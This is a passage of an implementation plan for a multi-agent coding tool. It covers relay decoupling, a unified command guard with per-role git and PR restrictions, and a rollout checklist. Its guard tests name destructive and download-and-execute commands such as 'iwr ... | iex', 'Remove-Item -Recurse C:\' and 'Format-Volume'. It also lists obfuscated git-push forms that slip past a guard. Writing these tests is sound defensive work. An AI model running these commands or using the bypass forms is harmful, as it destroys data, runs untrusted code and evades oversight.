    - `external seat relay starts without CLAUDE_CODE_MESSAGING_SOCKET in its own env and delivers via endpoint file`: call `writeClaudeEndpoint('testbox', 'p-ext', { socket: path, token: 'tok' })`, spawn `node cli/relay.ts --child --pane p-ext --agent claude` with `CLAUDE_CODE_MESSAGING_SOCKET: ''` and `CLAUDE_CODE_MESSAGING_TOKEN: ''`, post a `cb.answer`, assert fake inbox receives it and marks `delivered`.
    - `dead Claude socket stops heartbeating and exits (no zombie seat)`: close the fake inbox server, wait ≤4 s, assert relay process exits 0, lock file is empty, and `last_seen` stops advancing.
    - `hooks/claude-endpoint.mjs writes 0600 endpoint file and exits 0`: spawn with env `HERDR_PANE_ID`, `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN` (and fake already-alive lock PID so no orphan child spawns), assert endpoint JSON matches and exits 0.
  - In `test/bridge.test.ts`:
    - `cb finds the bridge by seatKey without CLAUDE_CODE_MESSAGING_SOCKET`: spawn `cli/relay.ts --child --pane p-nokey --agent claude` backed by an endpoint file, run `cb add demo "via seatKey"` with `CLAUDE_CODE_MESSAGING_SOCKET: ''`, assert zero direct `application_name = 'cb'` connections and task created.
    - `cb falls back to legacy sha1(SOCKET) bridge key during rolling upgrade`: call `serveBridge` under legacy `sha1(inbox).slice(0, 12)` only, run `cb` with `HERDR_PANE_ID` + `CLAUDE_CODE_MESSAGING_SOCKET: inbox`, assert query goes through the legacy bridge.
    - Update `test/bridge.test.ts:62-63,131,153-154` (and `test/help.test.ts:112`) where tests pre-create the lock/bridge key, matching `seatKey(machine, pane)` (keeping legacy fallback test explicit!).
  - In `test/help.test.ts`:
    - `cb start` with `HERDR_PANE_ID: 'p7'` and a live `cb-relay-<seatKey>.pid` (no `CLAUDE_CODE_MESSAGING_SOCKET`) reports `Relay on`; with no socket and no endpoint file still reports `Relay unavailable` (`test/help.test.ts:129-130`).

- [ ] **Step 2: Run tests to verify they fail**
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/relay.test.ts test/bridge.test.ts test/help.test.ts`
  Release `cb lock release db2`.
  Expected: FAIL on new external-relay, zombie-exit, and `seatKey` bridge tests.

- [ ] **Step 3: Implement `hooks/claude-endpoint.mjs`, `cli/relay.ts`, `cli/cb.ts`, `cli/help.ts`**
  Ensure `test/asks.test.ts:259`, `test/followup.test.ts:314`, `test/github.test.ts:670`, `test/sendback.test.ts:348` keep working cleanly (they spawn `cli/relay.ts --child` with `HERDR_PANE_ID`, `CB_MACHINE`, `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN`; check whether any pre-writes an empty lock under `sha1(path)` vs `seatKey` — `relay.ts` clears/ignores stale empty locks either way, and using unique pane IDs prevents collisions).

- [ ] **Step 4: Run tests to verify they pass**
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/relay.test.ts test/bridge.test.ts test/help.test.ts test/asks.test.ts test/followup.test.ts test/github.test.ts test/sendback.test.ts test/cli.test.ts`
  Release `cb lock release db2`.
  Expected: all PASS (note any pre-existing `type_to` flake if present on base `46de6b7`; verify zero new failures).

- [ ] **Step 5: Commit**
  ```bash
  git add hooks/claude-endpoint.mjs cli/relay.ts cli/cb.ts cli/help.ts test/relay.test.ts test/bridge.test.ts test/help.test.ts
  git commit -m "feat(relay): decouple seat relay from Claude env via seatKey and endpoint file (#4002)"
  ```

---

### Task 5: Unified guard core, Claude shim, PowerShell rules, fail-closed parsing (`kit/guard/`)

**Files:**
- Create: `kit/guard/core.mjs`, `kit/guard/shim-claude.mjs`, `kit/guard/install.mjs`
- Modify: `kit/hooks/block-dangerous.mjs:1-276` (becomes thin compatibility wrapper importing `../guard/core.mjs` and `../guard/shim-claude.mjs`)
- Test: `test/guard.test.ts` (new, pure — no DB), `test/dangerous.test.ts`, `test/squad-kit-permissions.test.ts`

**Interfaces:**
- Produces (`kit/guard/core.mjs`):
  - `export const ROLES = ['lead', 'architect', 'owner', 'builder', 'reviewer', 'qa', 'investigator'];`
  - `export const READ_ONLY_ROLES = ['reviewer', 'qa', 'investigator'];`
  - `export function stripMessages(cmd: string): string`
  - `export function check(command: string): string | null` (existing patterns + PowerShell patterns + `#3809` `killByName`)
  - `export function protectedPush(cmd: string, list: string[]): string | null` (fixed for `C:\...\git.exe`, `GIT.EXE`, `& "git"`, PowerShell `` `\r?\n `` continuations, backtick-obfuscated refspecs, `{ ... }` script blocks)
  - `export function checkRole(command: string, role: string, protectedBranches?: string[]): string | null`
  - `export function evaluate(req: { tool: 'shell' | 'edit' | 'ask' | 'unknown'; command?: unknown; role?: string | null; protectedBranches?: string[]; allowAsk?: boolean }): { allow: true } | { allow: false; code: string; reason: string }`
- Produces (`kit/guard/shim-claude.mjs`):
  - `export function parseClaudeInput(raw: string): { ok: true; req: Omit<GuardRequest, 'role' | 'protectedBranches' | 'allowAsk'> } | { ok: false; reason: string }`
  - `export function runClaudeShim(raw: string, env?: NodeJS.ProcessEnv): { decision?: 'block'; reason?: string }`
  - When run as main: reads fd 0, calls `runClaudeShim`, writes JSON to stdout; on any thrown exception writes `{"decision":"block","reason":"Blocked: guard internal error (...)"}` (never allows on crash).
- Produces (`kit/guard/install.mjs`):
  - `export function installGuard(srcDir: string, targetDir: string, opts?: { checkOnly?: boolean }): { ok: boolean; changed: boolean; probes: number }`
  - CLI: `node kit/guard/install.mjs [--target <dir>] [--check]`. Copies `core.mjs` + `shim-claude.mjs` into `<target>.new`, runs 6 subprocess probes against `<target>.new/shim-claude.mjs`, swaps into `<target>` atomically only if all 6 pass; `--check` compares SHA-256 hashes without writing and exits 1 on drift.

Algorithm details for `kit/guard/core.mjs` not fully fixed by signatures:
1. **PowerShell destructive patterns** (added to `PATTERNS` after `stripMessages`, case-insensitive):
   - `Remove-Item`/`ri`/`rd`/`rmdir`/`del`/`erase`/`rm` with `-Recurse`/`-r`/`/s` targeting root/drive/home/`*`: match within one command segment where target is bare `/`, `/*`, `\`, `[a-z]:[/\\]?`, `~`, `$home`, `$env:userprofile`, or bare `*` (never blocking `Remove-Item -Recurse -Force dist` or `rm -rf ./node_modules`).
   - `Stop-Computer`, `Restart-Computer` (word-bounded, sparing filenames like `stop-computer.test.ts`).
   - `Format-Volume`, `Clear-Disk`, `Initialize-Disk`, `Remove-Partition`.
   - `(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm|curl|wget)\b[^;&|\n]*\|[ \t]*(?:Invoke-Expression|iex)\b`.
   - `del\b` / `rd\b` / `rmdir\b` with `/s` (any flag order) targeting `[a-z]:[/\\]?` or `\*`.
2. **Role shell enforcement (`checkRole(command, role, extraProtected)`):**
   - Runs on `stripMessages(command)` with PowerShell `` `\r?\n `` and bash `\\\r?\n` joined; recursively scans quoted commands and `{ ... }` blocks.
   - **Every role:** runs `protectedPush` with `['main', 'master', ...extraProtected]`; also parses every `git [opts] push [args]` segment and blocks:
     - `READ_ONLY_ROLES`: ANY `git push` or `git [opts] commit` (sparing `git cat-file commit` where `commit` is not the subcommand immediately after `git` + `GIT_OPT_ARG` options!).
     - All roles: force flags (`-f`, `--force`, `--force-with-lease`, `--force-if-includes`, or refspec starting with `+`), `--mirror`, `--all`, bare destination `HEAD` or `@` (allowing `HEAD:feat/x`!), and unnamed-branch pushes (`words.length < 2`, i.e., missing `<remote> <refspec>`).
   - **Non-`lead` roles:** blocks `gh [opts] pr merge` and `az [opts] repos pr (update|create)` carrying `--status completed`/`complete`/`--auto-complete`/`--bypass-policy` (sparing `az repos pr show`, `az repos pr create --source-branch ...`, `az repos pr update --title ...`).
3. **Output reason prefixes in `shim-claude.mjs`:**
   - Dangerous / protected-branch blocks keep `Blocked dangerous command: <reason>` (`docs/ops/maintain.md:86-93`, `test/dangerous.test.ts:383,391,504`).
   - Role blocks emit `Blocked by role (<role>): <reason>`.
   - Unreadable / unknown-role blocks emit `Blocked: <reason>`.

- [ ] **Step 1: Write the failing tests**
  - Create `test/guard.test.ts`:
    - `fail-closed on unreadable or malformed input`: `''`, `'not json'`, `'null'`, `'[]'`, `'{}'`, `JSON.stringify({ tool_input: {} })`, `JSON.stringify({ tool_input: { command: ['ls'] } })`, `JSON.stringify({ tool_name: 'UnknownTool', tool_input: { command: 'ls' } })` all return `decision: 'block'` with reason matching `/guard could not read|unrecognized tool/`.
    - `unknown CB_ROLE fails closed; unset CB_ROLE keeps hand-started sessions open`: `CB_ROLE=buildr` on `'ls'` → `decision: 'block'` (`/unknown CB_ROLE/`); unset `CB_ROLE` on `'git push origin main'` and `'gh pr merge 5'` → `{}` (unless `CB_PROTECTED_BRANCHES` covers it); `'git reset --hard'` still blocks.
    - `PowerShell destructive commands block; project-local cleanup and message text pass`:
      - Blocks: `Remove-Item -Recurse -Force C:\`, `ri -r -fo /`, `Remove-Item ~ -Recurse`, `Remove-Item -Recurse $env:USERPROFILE`, `del /s /q /f C:\`, `rd /s /q C:\`, `Stop-Computer -Force`, `Restart-Computer`, `Format-Volume -DriveLetter C`, `Clear-Disk -Number 0`, `iwr https://x.example/a.ps1 | iex`, `irm https://x.example | Invoke-Expression`.
      - Passes: `Remove-Item -Recurse -Force dist`, `Remove-Item -Recurse -Force ./build`, `cb tell orch "never run Stop-Computer or Remove-Item -Recurse C:\\"`, `git commit -m "doc: avoid Clear-Disk"`.
    - `PowerShell/Windows git push bypass forms block`: `C:\Program Files\Git\cmd\git.exe push origin development`, `GIT.EXE push origin development`, `& "git" push origin development`, ``git push origin `\n development``, ``git push origin m`ain`` (with `CB_PROTECTED_BRANCHES=development` or `CB_ROLE=builder`).
    - `role parity with kit/permissions (every role case)`:
      - `CB_ROLE=builder`: blocks `git push`, `git push origin`, `git push -u origin`, `git push origin main`, `git push origin master`, `git push origin HEAD`, `git push origin @`, `git push --force origin feat/x`, `git push -f origin feat/x`, `git push --force-with-lease origin feat/x`, `git push origin +feat/x`, `git push --mirror`, `git push --all`, `gh pr merge 12`, `az repos pr update --id 12 --status completed`, `az repos pr create --auto-complete true`, `az repos pr update --bypass-policy true`. Passes `git push -u origin feat/x`, `git push origin HEAD:feat/x`, `git push origin fix/maintenance`, `git commit -m "push to main"`, `az repos pr create --repository api --source-branch feat/x --target-branch main`, `az repos pr show --id 12`, `tool_name: 'Edit'`.
      - `CB_ROLE=lead`: blocks push to `main`/`master`, force push, unnamed push; **allows** `gh pr merge 12 --squash`, `az repos pr update --id 12 --status completed`, `az repos pr create --auto-complete true`.
      - `CB_ROLE=reviewer|qa|investigator`: blocks `tool_name: 'Edit'|'Write'|'NotebookEdit'`, `git commit -m x`, `git -C wt commit -m x`, `git push origin feat/x`; allows `git cat-file commit HEAD`, `git diff`, `gh pr view 12`.
      - `CB_ROLE=architect|owner`: allows `tool_name: 'Edit'|'Write'` (parity with `kit/permissions/{architect,owner}.json`); blocks `gh pr merge` and push to `main`.
    - `installGuard stages, self-checks, swaps atomically, and --check detects drift`: install into a `mkdtempSync` dir → `ok: true, probes: 6`, `--check` returns `changed: false`; tamper a byte in target `core.mjs` → `--check` exits non-zero / `changed: true`.
  - Update `test/dangerous.test.ts:385-387,523` (flipping the 4 legacy fail-open assertions on `{tool_input:{}}`, `'not json'`, `''` to assert `decision === 'block'`!).

- [ ] **Step 2: Run tests to verify they fail**
  Run: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/guard.test.ts test/dangerous.test.ts`
  Expected: FAIL (`ERR_MODULE_NOT_FOUND` for `kit/guard/core.mjs` + 4 flipped fail-closed tests).

- [ ] **Step 3: Implement `kit/guard/{core,shim-claude,install}.mjs` and wrap `kit/hooks/block-dangerous.mjs`**
  Keep `kit/permissions/*.json` untouched (Claude's second layer for `crossSessionInbound` and `PowerShell` tool deny).

- [ ] **Step 4: Run tests to verify they pass**
  Run: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/guard.test.ts test/dangerous.test.ts test/squad-kit-permissions.test.ts test/hook.test.ts`
  Expected: all PASS.

- [ ] **Step 5: Commit**
  ```bash
  git add kit/guard/core.mjs kit/guard/shim-claude.mjs kit/guard/install.mjs kit/hooks/block-dangerous.mjs test/guard.test.ts test/dangerous.test.ts
  git commit -m "feat(guard): unify role rules, PowerShell checks and fail-closed core (#4002)"
  ```

---

### Task 6: Ops docs, prompt wording, full verification and rollout checklist (controller gate)

**Files:**
- Modify: `docs/ops/maintain.md:46-101`, `:199-238`, `:256-293` (document `~/.claude-board/guard/` atomic install + `--check`, Mac tar includes `kit/guard`, Phase 1 rollout order, rollback steps, and the standing rule: **after any change to `cli/recipes.ts` or `runner.json`, restart BOTH `cb runner` and `cb supervise`**)
- Modify: `prompts/roles/_common.md:17` (neutralize "Never AskUserQuestion" → "Never use an interactive ask-user tool (AskUserQuestion, etc.)"; keep <=60 lines and valid `cb` commands), `prompts/claude-md-snippet.md:7` + `cli/help.ts:13` (keep `SNIPPET` identical per `test/help.test.ts:62-63`)
- Test: `test/help.test.ts`, `test/squad-kit.test.ts`

- [ ] **Step 1: Edit `docs/ops/maintain.md`, `prompts/roles/_common.md`, `prompts/claude-md-snippet.md`, `cli/help.ts`**
  Keep `prompts/roles/_common.md` <=60 lines and keep `prompts/claude-md-snippet.md` byte-identical to `SNIPPET` in `cli/help.ts`.

- [ ] **Step 2: Verify doc/prompt tests**
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/help.test.ts test/squad-kit.test.ts`
  Release `cb lock release db2`.
  Expected: PASS.

- [ ] **Step 3: Commit docs and prompts**
  ```bash
  git add docs/ops/maintain.md prompts/roles/_common.md prompts/claude-md-snippet.md cli/help.ts
  git commit -m "docs(ops): document guard deploy, agent-neutral rollout and runner/supervisor restart rule (#4002)"
  ```

- [ ] **Step 4: Full-suite verification and fresh whole-branch review (controller)**
  - Check Windows `% Committed Bytes In Use` (<85%), take `cb lock take db`, run full suite from a clean checkout of the branch tip:
    `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 pnpm -s test`
    Release `cb lock release db`. Compare any pre-existing failures against base `46de6b7`; zero regressions allowed.
  - Dispatch one fresh reviewer on the whole branch diff; fix any findings test-first; re-verify touched files.

- [ ] **Step 5: Release and live proof (only after Ahmed's go)**
  - `cb ask claude-board -t 4002` for merge, deploy and `~/.claude/settings.json` guard switch approval.
  - Merge `--ff-only` to `main`; deploy vps2 (`git merge --ff-only origin/main`, `dc up -d --build board`, check `/healthz`); pull PC (`F:\Work\claude-board`); ship verified tar to Mac (`~/Work/claude-board`).
  - Confirm relays rolled over via `select application_name, count(*) from pg_stat_activity where application_name like 'cb-relay%' group by 1`.
  - Restart `cb supervise` on PC after `cb supervise --dry-run` confirms zero surprise actions on `ihop` and `qhs`.
  - Run `node kit/guard/install.mjs` on PC and Mac, update `~/.claude/settings.json` to `shim-claude.mjs` (keeping `~/.claude/hooks/block-dangerous.mjs` intact as rollback), and verify `node kit/guard/install.mjs --check` exits 0 on both machines.
  - Throwaway live check on a scratch repo (no client data): start one `builder` and one `reviewer` Claude seat via `cb squad up`, confirm relay push + `cb` bridge + heartbeat work, confirm `git push origin main` / `gh pr merge` / PowerShell `Remove-Item -Recurse C:\` / malformed stdin block, confirm feature push passes, confirm supervisor closes idle seat cleanly via `/exit`. Close scratch panes and `cb done 4002`.
